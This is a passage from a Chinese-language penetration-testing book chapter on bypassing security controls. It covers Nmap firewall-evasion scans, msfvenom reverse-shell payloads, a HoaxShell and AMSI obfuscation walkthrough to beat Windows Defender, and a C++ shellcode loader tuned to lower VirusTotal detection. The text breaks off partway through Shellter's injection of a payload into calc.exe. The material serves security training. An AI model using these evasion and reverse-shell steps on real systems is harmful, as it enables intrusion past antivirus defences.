  # 第 9 章 绕过安全控制](#contents.xhtml_ch09a)\n\n## 引言](#contents.xhtml_sc2_238a)\n\n在本章中，我们将探索计算机网络中绕过安全控制的艺术。这包括绕过\
  \ Windows 安全控制、反病毒安全控制和防火墙安全控制。我们还将深入研究社会工程以及用于渗透测试和网络成熟度评估的各种杂项技术。本章将为评估和增强计算机网络安全控制的有效性提供价值见解和技能。\n\
  \n## 结构](#contents.xhtml_sc2_239a)\n\n在本章中，我们将讨论以下主题：\n\n*   绕过安全控制的重要性\n*   安全控制的进展\n\
  *   网络侦察中的安全控制绕过\n*   智胜 Windows Defender\n*   反病毒规避技术和工具\n    *   利用 Metasploit\
  \ 模板和自定义二进制文件进行反病毒规避\n    *   `Shellter`\n    *   `Unicorn`\n    *   `Phantom-Evasion`\n\
  \    *   `Invoke-stealth`\n*   尖端 WAF 规避策略\n*   演变的社会工程策略\n    *   钓鱼模拟\n    * \
  \  `Gophish`\n\n## 目标](#contents.xhtml_sc2_240a)\n\n本章深入了绕过安全控制这一关键领域，强调了其重要性。它展示了安全技术的进步，并提供了有效规避的实用技术。通过探索网络探测、规避\
  \ Windows Defender 和高级 WAF 方法等主题，读者将获得 Metasploit 模板、`Shellter` 和 `Gophish` 等工具的使用权限。最终，读者将彻底掌握规避安全控制，使他们能够熟练地应对和克服复杂的安全措施。\n\
  \n## 绕过安全控制的重要性](#contents.xhtml_sc2_241a)\n\n绕过安全控制包含多个方面。其中一个方面涉及针对位于防火墙后或受端点安全和数据泄露防护（DLP）等安全措施保护的资产扩大攻击面，允许在没有这些控制的情况下评估其安全强度。此过程包括识别漏洞、利用弱点以及获取关键系统和敏感数据的未授权访问。第二个方面对于理解组织的安全态和有效性至关重要。通过成功绕过这些控制，可以揭示恶意者可能利用的潜在漏洞，有助于识别在安全措施初始设计和实施期间被忽视的漏洞。\n\
  \n此外，绕过安全控制为特定安全技术和机制的局限性和弱点提供了宝贵的见解。它使渗透人员能够评估各种防御措施的真实有效性，例如网络防火墙、Web 应用防火墙（WAF）、入侵检测系统（IDS）、加密协议和访问控制。通过突出已发现的缺陷，渗透人员可以生成一份包含建议的咨询报告。该报告是组织的宝贵资源，帮助他们制定短期、中期和长期投资计划，以确保对新兴威胁的充分保护。\n\
  \n| 注意：绕过安全控制揭示了被忽视的漏洞并暴露了安全技术的限制，使组织能够加强针对新兴威胁的防御。 |\n\n## 安全控制的进展](#contents.xhtml_sc2_242a)\n\
  \n随着技术的进步，攻击者不断调整方法，这使得渗透人员理解并评估安全控制的最新进展至关重要。现在，让我们研究安全控制的显著增强，如图 9.1\n\n图 9.1：安全控制的进展\n\
  \n## 尖端技术](#contents.xhtml_sc3_243a)\n\n在现代网络安全领域，三项关键进展正在重塑组织保护数字资产的方式：\n\n*  \
  \ 下一代防火墙：通过深度包检测等高级功能，增强对复杂攻击的检测和预防。\n*   基于行为的异常检测：快速检测网络和用户行为的偏差，向安全团队告警潜在威胁。\n\
  *   AI 驱动的威胁情报：通过分析数据集和关联指标主动捕猎威胁，协助识别和缓解威胁。\n\n## 智能系统](#contents.xhtml_sc3_244a)\n\
  \n驱动数字防御演变的两个智能系统：\n\n*   机器学习和人工智能：结合机器学习和人工智能改进了安全控制，以实现实时异常检测、自动化响应和自适应威胁建模。\n\
  *   自动化与编排：具有自动化的安全控制简化了事件处理，能够更快速地遏制缓解威胁。\n\n## 演变的威胁格局](#contents.xhtml_sc3_245a)\n\
  \n以下是突显网络安全实践为应对日益复杂的威胁而演变的两点：\n\n*   零信任架构：这种安全模型拒绝对用户和设备的自动信任，要求访问资源时进行持续的身份验证和确认。\n\
  *   基于机器学习的高级恶意软件检测：安全控制利用机器学习算法识别并对抗复杂的恶意软件，包括多态和零日威胁。\n\n\n\n\n\n# 云特定安全控制措施\n\
  \n以下内容讨论了用于保护云环境的云特定安全控制和框架：\n\n*   云安全态势管理 (CSPM)：这些控制措施通过监控配置、识别漏洞以及确保符合最佳实践来帮助保护云环境。\n\
  *   云安全矩阵 (CSM)：CSM 是一个强健的框架，用于指导组织保护其云环境。它整合了行业公认的标准，如云安全联盟 (CSA)、云控制矩阵 (CCM)、互联网安全中心\
  \ (CIS) 控制措施以及美国国家标准与技术研究院 (NIST) 网络安全框架。\n\n| 注意：在追求遵循零信任架构原则时，组织优先采用尖端技术、智能系统和云特定控制措施是至关重要的。\
  \ |\n\n# 网络侦察中的安全控制绕过\n\n在利用 `Nmap` 进行侦察时，有几种技术可以用于绕过安全控制措施。让我们探索这些这些类别及其子项，以及相关的命令和步骤：\n\
  \n首先，让我们检查目标 `Windows 10` 机器上启用或禁用了 `Windows Firewall`。如图 9.2 所示，观察到 `Windows Firewall`\
  \ 当前处于启用状态：\n\n![](img/Figure_9.2.png)\n\n图 9.2：Windows Firewall 已启用\n\n## 源端口操\n\
  \n源端口操涉及将原始源端口更改为常用端口，从而增加 `IDS` 或 `firewalls` 识别和阻止扫描活动的难度。要执行此技术，请使用命令 `nmap -g\
  \ <common-source-port> targetIP`，如图 9.3 所示：\n\n![](img/Figure_9.3.png)\n\n图 9.3：源端口操\n\
  \n## IP 地址欺骗 / 诱骗 IP\n\nIP 地址欺骗能够创建或手动选择诱骗 IP 地址，为 `IDS` 或 `firewalls` 准确识别真实来源带来了巨大障碍。要使用此技术，请利用命令\
  \ `nmap -S <decoy-IP> targetIP` 或 `nmap -D RND:<random host number> targetIP`，如图\
  \ 9.4 所示：\n\n![](img/Figure_9.4.png)\n\n图 9.4：IP 地址欺骗\n\n## 数据包分片\n\n数据包分片技术向目标发送分片探测包，这些包在接收时会被重组。这种方法可以有效绕过特定的入侵检测系统\
  \ (`IDS`) 和防火墙。要使用此技术，执行命令 `nmap -f targetIP`，如图 9.5 所示：\n\n![](img/Figure_9.5.png)\n\
  \n图 9.5：数据包分片\n\n## 欺骗 MAC 地址\n\nMAC 地址欺骗涉及更改原始 MAC 地址以隐藏发送者的真实身份。这种技术用于掩盖网络流量的源。要执行此方法，使用命令\
  \ `nmap --spoof-mac <spoofed-MAC> targetIP`，如图 9.6 所示：\n\n![](img/Figure_9.6.png)\n\
  \n图 9.6：MAC 地址欺骗\n\n## 自定义数据包创建\n\n创建自定义数据包允许发送特殊数据包，以越过防火墙和其他安全措施扫描目标。\n\n1.  `--data-length`\
  \ 命令便于指定附加数据所需的长度。要利用此功能，执行命令 `nmap --data-length <length> targetIP`，如图 9.7 所示：\n\
  \n    ![](img/Figure_9.7.png)\n\n    图 9.7：自定义数据包创建 (Data-length)\n\n2.  `--data-string`\
  \ 命令允许向数据包中添加特定字符串，从而包含自定义内容。要利用此功能，执行命令 `nmap --data-string \"<string>\" targetIP`，如图\
  \ 9.8 所示：\n\n    ![](img/Figure_9.8.png)\n\n    图 9.8：自定义数据包创建 (Data-string)\n\n\
  3.  另一方面，`--data` 命令通过通过以十六进制格式提供数据，允许在各种格式（包括二进制）中包含自定义数据。要利用此功能，执行命令 `nmap --data\
  \ <hex string> targetIP`，如图 9.9 所示：\n\n    ![](img/Figure_9.9.png)\n\n    图 9.9：自定义数据包创建\
  \ (Data)\n\n## Nmap 脚本引擎脚本\n\nNmap 脚本引擎 (`NSE`) 脚本允许利用专门定制脚本来绕过防火墙限制并发现漏洞。这些脚本包含了数据包分片、源端口操、IP\
  \ 地址欺骗以及其他专门设计用于绕过防火墙的方法。要执行脚本，使用命令 `nmap --script=firewall-bypass targetIP`，如图\
  \ 9.10 所示：\n\n![](img/Figure_9.10.png)\n\n图 9.10：Nmap NSE 脚本\n\n| 注意：在进行防火墙绕过侦察时，对目标进行深入研究、采用隐蔽扫描技术、利用加密和隧道方法、规避基于特征的检测并熟练操网络流量至关重要。\
  \ |\n\n# 胜过 Windows Defender\n\nWindows 系统带有名为 `Windows Defender` 的内置安全控制。在本节中，我们的目标是绕过\
  \ `Windows Defender` 的检测能力并建立反向连接。为了说明这一点，让我们考虑一种场景：我们作为攻击者，已经获得了受害者组织内 `Windows\
  \ 10` 工作站的低权限用户访问。该系统 `Windows Defender` 正在运行并开启了所有保护措施。我们的目标是执行多个恶意脚本用于枚举和横向移动，这些可能会被防御程序拦截。\n\
  \n我们将分两个阶段探索这一概念。第一阶段涉及生成通用负载（payload）并评估它是否被安全措施拦截。在第二阶段，我们将使用高级方法生成实现完全不可检测 (FUD)\
  \ 状态的负载，允许我们绕过安全控制措施。\n\n## 第一阶段：探索 Windows 10 上建立反向连接的基本方法\n\n在本节中，我们将利用 `msfvenom`\
  \ 使用基本方法生成反向连接负载。让我们探索下述分步骤的方法：\n\n1.  让我们首先检查 `Windows Defender` 的启用和更新状态，如图 9.11、9.12\
  \ 和 9.13 所示：\n\n    参考下方的图 9.11，图中显示了指定的 `Windows 10` 系统：\n\n    ![](img/Figure_9.11.png)\n\
  \n    图 9.11：Windows 10 机器\n\n    图 7.12 所示的是 `Windows Defender` 的当前状态，显示其已更新：\n\
  \n    ![](img/Figure_9.12.png)\n\n    图 9.12：已更新的 Windows Defender\n\n    图 7.13\
  \ 所示的是 `Windows Defender` 的当前状态，显示其启用状态：\n\n    ![](img/Figure_9.13.png)\n\n   \
  \ 图 9.13：Windows Defender 已启用\n\n2.  接下来，使用命令 `msfvenom -p windows/meterpreter/reverse_tcp\
  \ LHOST=<Your_IP_Address> LPORT=<Listening_Port> -f <Payload_Format> -o <Output_File>`\
  \ 创建负载，如图 9.14 所示：\n\n    ![](img/Figure_9.14.png)\n\n    图 9.14：使用 msfvenom 创建负载\n\
  \n\n\n\n\n3. 运行命令 `python3 –m http.server 8080` 来运行 Apache HTTP 服务器，以便将 payload\
  \ 传输到目标机器，如图图 9.15\n\n    图 9.15：运行 Apache HTTP 服务器\n\n4. 现在，在 Windows 10 上打开浏览器并访问\
  \ URL `https://192.168.29.15/winpayload.exe` 开始下载 payload，如图图 9.16\n\n    图 9.16：在目标机器上下载\
  \ payload\n\n5. 在此阶段，我们观察到 Windows Defender 在执行之前阻止了 payload。因此，我们无法通过这种方法执行 payload\
  \ 并建立反向连接。参见图 9.17：\n\n    ![](img/Figure_9.17.png)\n\n    图 9.17：Windows Defender\
  \ 已阻止了 payload\n\n## 第二阶段：使用 hoaxshell 和 AMSI 触发绕过 Windows Defender\n\nHoaxShell\
  \ 和 AMSI 绕过技术通常被恶意人员用作攻击策略的一部分。HoaxShell 是一个专门设计用于规避多种安全控制的强大框架，特别包括恶意软件扫描接口（AMSI）触发。通过利用\
  \ HoaxShell，攻击者旨在规避杀病毒软件和其他防护措施的检测。另一方面，由微软开发的 AMSI 是反病毒软件和其他安全解决方案用于扫描和识别存在于活动进程中的恶意代码的接口。它是检测潜在有害活动的关键组件。\n\
  \n让我们了解使用以下技术绕过安全控制的逐步方法：\n\n1. 首先，将 AMSI 触发二进制文件下载到 Windows 主机。建议在测试机上执行此步骤，以避免对目标系统产生任何干扰。参见图\
  \ 9.18：\n\n    下载链接：[`github.com/RythmStick/AMSITrigger/releases/tag/v3`](https://github.com/RythmStick/AMSITrigger/releases/tag/v3)\n\
  \n    ![](img/Figure_9.18.png)\n\n    图 9.18：下载 AMSI 触发二进制文件\n\n2. HoaxShell 是一个\
  \ Windows 反向 shell payload 生成器和处理器，它利用 http(s) 协议建立反向 shell。你可以从 GitHub 下载它，如图图\
  \ 9.19\n\n    ![](img/Figure_9.19.png)\n\n    图 9.19：Hoaxshell GitHub\n\n3. 在攻击者机器（Kali\
  \ Linux）上使用 `wget https://github.com/t3l3machus/hoaxshell/archive/refs/heads/main.zip`\
  \ 命令下载 HoaxShell，如图图 9.20\n\n    图 9.20：下载 HoaxShell\n\n4. 进入 HoaxShell 文件夹并执行命令\
  \ `python hoaxshell.py -s 192.168.29.15 -r -H \"Authorization\"` 来生成反向 shell 原始\
  \ payload。最后，hoaxshell 将自动启动监听器，无需使用 Netcat 或 Metasploit 等工具启动单独监听器。参见图 9.21：\n\n\
  \    ![](img/Figure_9.21.png)\n\n    图 9.21：生成反向 shell 原始 payload\n\n5. 复制原始 payload\
  \ 脚本并进入测试 Windows 10 机器上的 AMSI Trigger 文件夹。创建一个文本文件，粘贴代码，并将其保存为 PowerShell 脚本 `.ps1`，如图图\
  \ 9.22\n\n    图 9.22：将原始 payload 脚本复制到测试机\n\n6. 在 PowerShell 中运行命令 `.\\AmsiTrigger_x64.exe\
  \ -i .\\winpayload.ps1` 以验证脚本是否被 AMSI 检测。在这种情况下，它被检测到了。请注意，你可能需要在测试机上临时禁用 Windows\
  \ Defender 以保存 payload 并进行必要的检查。参见图 9.23：\n\n    ![](img/Figure_9.23.png)\n\n  \
  \  图 9.23：验证脚本是否被 AMSI 检测\n\n    为了绕过安全检测，应用三种类型的修改。首先，通过识别带有 `$` 符号的变量，因为所有带有此符号的内容都代表变量。其次，更改标准关键字的大小，例如将它们从小写转换为大写或反之。第三，在任何命令关键字的中间引入单引号（`‘`）以破坏检测机制。\n\
  \n7. 对 payload 原始代码进行了多处更改。为了方便比较和增强理解，我们提供了原始代码和混淆代码，如图图 9.24\n\n    图 9.24：原始代码与混淆代码\n\
  \n8. 在 AMSI trigger 文件夹中创建一个新的 PowerShell 脚本，并运行命令 `.\\AmsiTrigger_x64.exe -i .\\\
  winpayload.ps1` 测试检测是否被绕过，如图图 9.25\n\n    图 9.25：验证脚本是否被 AMSI 检测\n\n9. 将修改后的 reverse\
  \ shell 脚本放到目标 Windows 10 主机。在 PowerShell 中执行脚本，应当执行成功，如图图 9.26\n\n    图 9.26：在目标机器上运行\
  \ reverse shell 脚本\n\n10. 你已成功在目标 Windows 10 主机上获取反向 shell。现在可以启动权限提升和横向移动。参见图 9.27：\n\
  \n    ![](img/Figure_9.27.png)\n\n    图 9.27：获取反向 shell\n\n注意：像 HoaxShell 一样，黑网上有许多开源和付费工具。然而，一旦这些工具或脚本出现，杀病毒软件（AV）就会更新其数据库和规则来应对。因此，曾经有效的技术随着时间的推移而失效，导致研究人员在不断的创新和适应中开发新技术。\n\
  \n杀病毒绕过技术和工具包括恶意行为者利用复杂方法和技术来逃避检测并绕过杀病毒软件。其主要目标是让传统的杀病毒程序难以识别或分析恶意代码或文件。\n\n为了绕过检测，测试人员采用了多种技术，如表\
  \ 1 所示：\n\n| 技术 | 描述 |\n| :--- | :--- |\n| 代码混淆（Code Obfuscation） | 使用加密、随机化和操作修改代码结构使其难以检测。\
  \ |\n| 多态（Polymorphism） | 生成具有相同功能的变体以绕过基于特征的检测。 |\n| 变形（Metamorphism） | 每次感染时更改代码和行为，使杀病毒程序难以识别。\
  \ |\n| 加壳与加密（Packing and Encryption） | 压缩或加密恶意软件以掩盖其真实性质并防止被分析。 |\n| Rootkits |\
  \ 篡改系统函数或 API 以从杀病毒软件中隐藏恶意活动和进程。 |\n\n\n\n\n\n| 零日漏洞 | 在防病毒软件供应商开发出相应的特征码或更新之前，利用未知的软件漏洞。\
  \ |\n| :--- | :--- |\n\n**表 9.1: 反杀毒规避技术**\n\n### 反杀毒规避工具\n\n反杀毒规避工具是指协助绕过或规避杀毒检测的软件或脚本。表\
  \ 9.2 给出了几种杀毒规避工具的示例：\n\n| 工具 |  |\n| :--- | :--- |\n| 利用 Metasploit 模板和自定义二进制文件进行杀毒规避\
  \ | 流行的渗透测试框架，带有利用漏洞和绕过杀毒软件的模块。 |\n| Shellter | 用于绕过杀毒软件的动态 shellcode 注入工具。 |\n\
  | Unicorn | 基于 PowerShell 的工具，用于生成混淆且不可检测的有效负载可执行文件。 |\n| Phantom-Evasion | 强大的规避工具，提供多种混淆技术以绕过杀毒检测。\
  \ |\n| Invoke-Stealth | 设计用于渗透测试活动期间规避杀毒检测的工具。 |\n\n**表 9.2: 反杀毒规避工具**\n\n### 利用\
  \ Metasploit 模板和自定义二进制文件进行杀毒规避\n\nMetasploit 是一个强大的渗透测试框架，提供了各种用于有效规避杀毒（AV）的模板和技术。这些模板提供了代码混淆、多态和打包等选项，以创建不易被杀毒软件标记的自定义有效负载（payload）。通过利用\
  \ Metasploit 多功能的能力，从业人员可以显著提高成功规避杀毒防御的概率。这使得渗透人员能够进行更全面的安全评估和测试。\n\n为了全面理解这一过程，我们将按照以下方式采用各种技术：\n\
  \n#### 基准有效负载\n\n1. 为了建立基准，我们将使用命令 `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.29.15\
  \ LPORT=4444 -f exe > basepayload.exe` 为 32 位 Windows 系统生成标准的 `msfvenon` 反向 shell\
  \ 有效负载，如图 9.28 所示：\n   ![](img/Figure_9.28.png)\n   图 9.28: 生成标准的 msfvenon 反向 shell\
  \ 有效负载\n\n2. 随后，我们将生成的有效负载上传到 VirusTotal 以评估其检测率。如图 9.29 所示，检测比例为 56/70：\n   ![](img/Figure_9.29.png)\n\
  \   图 9.29: 将有效负载上传到 VirusTotal\n\n3. 在生成有效负载期间，我们自定义的 shellcode 被注入到模板二进制文件中。为了观察这一点，请执行命令\
  \ `cd /usr/share/metasploit-framework/data/templates/src/pe/exe` 和 `cat template.c`，如图\
  \ 9.30 所示，它展示了使用默认模板二进制文件的早期有效负载生成：\n   ![](img/Figure_9.30.png)\n   图 9.30: 模板二进制文件\n\
  \n#### 技术 1\n\n1. 为了进一步减少 VirusTotal 的检测，我们可以对代码进行一些更改，特别是在内存分配大小上。如图 9.31 所示，在内存分配和字符大小处实现修改：\n\
  \   ![](img/Figure_9.31.png)\n   图 9.31: 代码更改\n\n2. 为了更好地掌握工作流程，让我们简单地重新编译标准模板，并使用新编译的模板重新生成有效负载。执行的一系列命令请参阅图\
  \ 9.32：\n   命令如下：\n   a. `i686-w64-mingw32-gcc template.c -lws2_32 -o avbypassummed.exe`\n\
  \   b. `sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.29.15 LPORT=4444\
  \ -x /usr/share/metasploit-framework/data/templates/src/pe/exe/avbypassummed.exe\
  \ -f exe > /home/ummedmeel/Desktop/ummedpayload.exe`\n   ![](img/Figure_9.32.png)\n\
  \   图 9.32: 重新编译标准模板\n\n3. 代码调整后，将新生成的有效负载上传到 VirusTotal 以评估其检测率。图 9.33 显示检测比例降低至\
  \ 48/71：\n   ![](img/Figure_9.33.png)\n   图 9.33: 将新生成的有效负载上传到 VirusTotal\n\n####\
  \ 技术 2\n\n1. 现在，让我们深入一种更具化的方法来构建二进制文件。利用 `msfvenom` 执行命令 `msfvenom -p windows/shell_reverse_tcp\
  \ LHOST=192.168.29.15 LPORT=4444 -f c` 来导出反向 tcp 有效负载。这将生成如图 9.34 所示的有效负载：\n   ![](img/Figure_9.34.png)\n\
  \   图 9.34: 使用 msfvenom 生成原始有效负载\n\n2. 为了合并二进制文件和有效负载并生成自定义有效负载，我们将使用 Visual Studio\
  \ 2022。在你的 Windows 系统上安装 Visual Studio（社区版），导航到“创建项目”，选择“空项目”，右键点击“源文件”以添加“新建项”，并将其命名为\
  \ `main.cpp.`，如图 9.35、9.36 和 9.37 所示：\n   点击下图图 9.35 所示的“创建项目”：\n   ![](img/Figure_9.35.png)\n\
  \   图 9.35: 创建新项目\n   点击下图图 9.36 所示的“空项目”：\n   ![](img/Figure_9.36.png)\n   图 9.36:\
  \ 空项目\n   点击下图图 9.37 所示的“新建项”：\n   ![](img/Figure_9.37.png)\n   图 9.37: 添加新项\n\n\
  3. 在 `main.cpp` 文件中，粘贴下方提到的提供的代码，如图 9.38 所示。这一步是必要的，因为标准模板二进制文件很容易被杀毒软件检测。通过使用自定义模板，我们可以克服这一限制：\n\
  \   ```cpp\n#include <stdio.h>\n#include <windows.h>\n\nunsigned const char payload[]\
  \ = \"\";\n\nsize_t size = 0;\n\nint main(int argc, char** argv) {\n   char* code;\n\
  \   printf(\"This is just a random string!\\n\");\n   code = (char*)VirtualAlloc(NULL,\
  \ size, MEM_COMMIT,PAGE_EXECUTE_READWRITE);\n   memcpy(code, payload, size);\n \
  \  ((void(*)())code)();\n   return(0);\n}\n   ```\n   ![](img/Figure_9.38.png)\n\
  \   图 9.38: 自定义模板\n\n4. 从之前的有效负载生成过程中获取有效负载大小数字（排除 c 文件的最终大小），例如 1392 字节。将 `payload[]`\
  \ 中的占位符替换为 `buf[]` 中生成的 shellcode，如图 9.39 所示：\n   ![](img/Figure_9.39.png)\n   图\
  \ 9.39: 更新有效负载大小\n\n5. 引入随机文本以每次生成不同的特征码，如图 9.40 所示：\n   ![](img/Figure_9.40.png)\n\
  \   图 9.40: 引入随机文本\n\n6. 继续到 Visual Studio，从生成下拉菜单中选择 Release，并启动最终有效负载的生成过程，如图\
  \ 9.41 所示：\n   ![](img/Figure_9.41.png)\n   图 9.41: Release 有效负载\n\n7. 成功生成后，有效负载将存储在系统上的指定位置，如图\
  \ 9.42 所示：\n   ![](img/Figure_9.42.png)\n   图 9.42: 生成的有效负载\n\n8. 将生成的有效负载上传到 VirusTotal\
  \ 以检查其检测率，如图 9.43 所示，检测比例降低至 41/70：\n   ![](img/Figure_9.43.png)\n   图 9.43: 将生成的有效负载上传到\
  \ VirusTotal\n\n#### 技术 3\n\n1. 为了进一步减少 VirusTotal 的检测，让我们利用 `msfvenom` 将反向有效导出为编码\
  \ shellcode。执行命令 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=191.168.29.15\
  \ LPORT=4444 -e x86/shikata_ga_nai -i 8 -f c`，同时修改你的监听器 IP 和端口。你可以调整迭代次数 `-i 8`；在大多数情况下，使用最多\
  \ 25 次迭代应该是安全的，如图 9.44 所示：\n\n\n\n\n\n![](img/Figure_9.44.png)\n图 9.44：生成编码后的 shellcode\n\
  \n2. 按照阶段阶段说明，在 Visual Studio 中重复上述过程以创建载荷，如图 9.45 所示：\n\n![](img/Figure_9.45.png)\n\
  图 9.45：生成载荷\n\n3. 最后，将新生成的载荷上传到 VirusTotal 以评估其检测率，该检测率应显示降低至 38/71，如图 9.46 所示：\n\
  \n![](img/Figure_9.46.png)\n图 9.46：将新生成的载荷上传到 VirusTotal\n\n| 提示：Metasploit 拥有大量的利用程序、载荷和规避技术，通过规避\
  \ AV（杀毒软件）检测成功入侵系统。利用先进的规避技术可以降低检测率，增强安全评估的有效性。 |\n\n## Shellter](#contents.xhtml_sc4_259a)\n\
  \nShellter 是一种高级且动态的 shellcode 注入工具，广泛用于红队行动以及渗透测试人员和道德黑客进行的安全评估。其主要目标是规避 AV 软件和\
  \ IDS。Shellter 通过对载荷采用动态加密或编码技术来实现这一目标。\n\n通过使用进程空洞（process hollowing）的技术，Shellter\
  \ 将恶意 shellcode 注入到合法进程的内存空间中。此外，研究人员可以利用此工具评估安全控制的有效性，并识别组织防御机制中的潜在漏洞。\n\n让我们通过以下步骤深入研究\
  \ Shellter 的各种应用。你可以灵活选择任何可执行文件进行载荷注入。在演示中，我们将展示 `calc.exe` 的用法。首先，我们将关注单层 Shellter，因为通过逐渐增加自定义程度可以有效缓解\
  \ AV 检测。请按照下面的步骤操作：\n\n1. 在 Kali Linux 上运行运行 `shellter` 命令来安装并启动 Shellter。选择自动模式，如图\
  \ 9.47 所示：\n\n![](img/Figure_9.47.png)\n图 9.47：在 Kali Linux 上安装并启动 Shellter\n\n\
  2. 从网站 `https://www.filehorse.com/download-windows7-calculator/download/` 下载计算器可执行文件。\n\
  \n3. 指定将作为载荷载体的目标可执行文件。该文件应适用于你的目标环境。在这种情况下，我们将使用 `calc.exe` 可执行文件作为容器，如图 9.48 所示：\n\
  \n![](img/Figure_9.48.png)\n图 9.48：指定目标可执行文件\n\n4. 选择隐身模式（stealth mode）选项，如图 9.49\
